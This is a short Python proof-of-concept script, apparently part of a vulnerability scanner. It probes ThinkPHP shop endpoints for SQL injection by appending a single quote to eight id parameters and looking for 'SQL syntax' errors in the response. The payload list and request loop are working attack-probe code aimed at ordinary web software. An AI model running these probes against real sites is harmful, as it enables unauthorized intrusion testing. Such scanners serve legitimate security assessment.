# encoding: utf-8
'''
@Version:   V1.0
@Author:    JE2Se
@Contact:   admin@je2se.com
@Website:   https://www.je2se.com
@Github:    https://github.com/JE2Se/
@Time:  2020/6/10 17:07
@File:  ThinkPHP_Multi_SQL_LEAK_POC.py
@Desc:
'''
import requests
from lib import *
from lib.Urldeal import umethod
import logging

def ThinkPHP_Multi_SQL_LEAK_POC(Url):
    scheme, url, port = umethod(Url)
    headers = {
        "User-Agent":  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0",
    }
    payloads = [
        r'/index.php?s=/home/shopcart/getPricetotal/tag/1%27',
        r'/index.php?s=/home/shopcart/getpriceNum/id/1%27',
        r'/index.php?s=/home/user/cut/id/1%27',
        r'/index.php?s=/home/service/index/id/1%27',
        r'/index.php?s=/home/pay/chongzhi/orderid/1%27',
        r'/index.php?s=/home/order/complete/id/1%27',
        r'/index.php?s=/home/order/detail/id/1%27',
        r'/index.php?s=/home/order/cancel/id/1%27',
    ]
    try:
        for i in payloads:
            payload_url = scheme + "://" + url + ":" + str(port) + i
            resp = requests.get(payload_url, headers=headers, timeout=6, verify=False)
            con = resp.text
            if r"SQL syntax" in con:
                print(Vcolors.RED +"[!] 存在ThinkPHP SQl Leak漏洞:->ThinkPHP_Multi_SQL_LEAK\r" + Vcolors.ENDC)
    except:
        logging.error("ThinkPHP_Multi_SQL_LEAK_POC脚本出现异常")